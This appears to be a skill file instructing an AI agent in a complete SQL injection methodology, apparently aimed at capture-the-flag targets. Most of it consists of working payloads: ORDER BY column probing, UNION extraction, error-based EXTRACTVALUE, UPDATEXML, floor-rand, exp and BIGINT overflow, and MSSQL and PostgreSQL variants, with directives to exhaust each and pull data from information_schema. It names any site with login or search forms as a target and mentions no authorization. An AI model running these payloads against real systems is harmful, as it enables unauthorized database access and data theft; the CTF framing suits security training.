---
name: sql-injection-methodology
description: "Complete methodology for SQL injection detection, exploitation, and bypass. Use when the target has form submissions, login pages, search functions, or data query interfaces. Includes POST parameter integrity checks, the EXTRACTVALUE truncation trap, and the full UNION/error-based/blind/sqlmap workflow"
zh-signals: "完整的 SQL 注入检测、利用与绕过方法论，涵盖 UNION、报错、盲注与 sqlmap。信号:SQL注入,UNION注入,盲注,WAF绕过,sqlmap"
when-to-use: "Use when a target has forms, login pages, search functions, or data query interfaces and you need a full SQL injection detection, exploitation, and WAF bypass methodology."
metadata:
  tags: "sqli,sql injection,injection,database,bypass,waf,login,search,form,union-injection,boolean-based,blind-injection,error-based-injection"
  category: "exploit"
  mitre_attack: "T1190,T1059"
---

# Complete SQL Injection Methodology


## ⛔ Deep Reference (must read when Phase 3 truncation occurs!)

- UNION/error-based injection payloads + EXTRACTVALUE auto-extraction Python script → [references/union-and-error.md](references/union-and-error.md)
- Boolean-based blind/time-based blind injection + automation Python script → [references/blind-injection.md](references/blind-injection.md)
- WAF bypass + sqlmap → [references/waf-bypass-sqlmap.md](references/waf-bypass-sqlmap.md)
- Second-order injection/stacked queries/INSERT-UPDATE/SQLite/INTO OUTFILE → [references/advanced-injection.md](references/advanced-injection.md)
- Database-specific injection techniques (MSSQL/Oracle/PostgreSQL/Access) → [references/db-specific-injection.md](references/db-specific-injection.md)

---

## Phase 0: POST Parameter Integrity (do this first!)

1. Use analyze_response to extract the names of **all** input/button elements (including hidden and submit)
2. **The submit button must be included** — PHP uses `isset($_POST['submit'])` for validation
3. Anomaly: injecting `'` returns the same response as a normal value → a parameter is missing, check immediately

## Phase 1: Injection Point Discovery + Column Count Confirmation

1. Single quote `'` test → an error means injection exists
2. **ORDER BY binary search** to determine the exact column count (⛔ do NOT increment one by one from 1):
   ```
   ORDER BY 10 → error → ORDER BY 5 → success → ORDER BY 8 → error
   → ORDER BY 6 → success → ORDER BY 7 → error → column count = 6
   ```
   ⛔ **ORDER BY N succeeding ≠ the column count is N! You must find the N+1 failure boundary to confirm it**

## Phase 2: UNION Injection (preferred! all 6 variants must be exhausted before giving up)

UNION has no truncation limit, so it retrieves the complete flag in one shot. **All 6 variants must be tried in the following order**:

```sql
-- ① Standard UNION (make the original query empty)
' AND 1=2 UNION SELECT 1,2,3,4,5,6-- 
-- ② NULL instead of numbers
' AND 1=2 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
-- ③ Different comment markers
' AND 1=2 UNION SELECT 1,2,3,4,5,6#
' AND 1=2 UNION SELECT 1,2,3,4,5,6-- -
-- ④ Case/comment bypass
' AND 1=2 UNiON SeLeCT 1,2,3,4,5,6-- 
-- ⑤ Identify the display position: which number (2/3/4) appears in the response? Put the query in that position
' AND 1=2 UNION SELECT 1,database(),3,4,5,6-- 
-- ⑥ Inspect the full HTML source (not just the summary) and search for the numbers 1-6 in hidden elements
```

**Strategy**: as soon as a variant succeeds in locating the display position (a number appears in the response), immediately use that variant to extract data — there is no need to test the remaining variants. Only move to Phase 3 if all of them fail.

## Phase 3: Error-Based Injection (use after UNION fails — truncation trap!)

Error-based injection has multiple variants, **try them in priority order** (if one is filtered, switch to the next):

### Method 1: EXTRACTVALUE (preferred, MySQL 5.1+)
Returns at most 32 characters:
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))-- 
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())))-- 
```

### Method 2: UPDATEXML (when EXTRACTVALUE is filtered)
```sql
' AND UPDATEXML(1,CONCAT(0x7e,database()),1)-- 
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)-- 
```

### Method 3: floor+rand (MySQL classic, best compatibility)
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- 
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flag LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- 
```

### Method 4: exp() overflow (MySQL 5.5.5-5.5.49)
```sql
' AND exp(~(SELECT*FROM(SELECT database())a))-- 
```

### Method 5: BIGINT overflow
```sql
' AND !(SELECT*FROM(SELECT database())a)-~0-- 
```

**Database differences**:
- MSSQL: `' AND 1=CONVERT(int,@@version)--` or `' AND 1=CAST(db_name() AS int)--`
- PostgreSQL: `' AND 1=CAST(version() AS int)--`

### ⛔⛔⛔ When extracting the flag value: manual SUBSTRING concatenation is forbidden! You must use a script!

**Trigger condition**: the flag returned by EXTRACTVALUE is truncated (shorter than expected)
**Mandatory actions**:
1. ⛔ **Immediately execute** [references/union-and-error.md](references/union-and-error.md) to get the Python auto-extraction script
2. Run that Python script with bash (automatic segmentation + concatenation + LENGTH verification)
3. ⛔ Never write SUBSTRING by hand → hand-assembled hex always drops characters → this has already caused 2 consecutive task failures

## Phase 4: ⛔ Mandatory Verification Before Delivering the Flag (regardless of the injection method used)

**Before reporting a flag, all of the following checks must pass, otherwise it must not be reported:**

```sql
-- 1. Query the real length
' AND EXTRACTVALUE(1,CONCAT(0x7e,LENGTH((SELECT flag FROM flag))))-- 
```

| Check item | Method | Action on failure |
|--------|------|-----------|
| Length match | `len(flag) == LENGTH()` return value | Re-extract, do not report |
| Format correct | Starts with `flag{` and ends with `}` | Re-extract |
| Hash sanity | The hash length inside `flag{...}` is usually 32/40/64 | Re-extract if the length looks abnormal |

⛔ **Skipping this verification and reporting the flag directly = task failure. This is the last line of defense.**

## POST Parameter Integrity
- Difference between curl and the browser: the browser sends certain parameters automatically, curl must add them manually
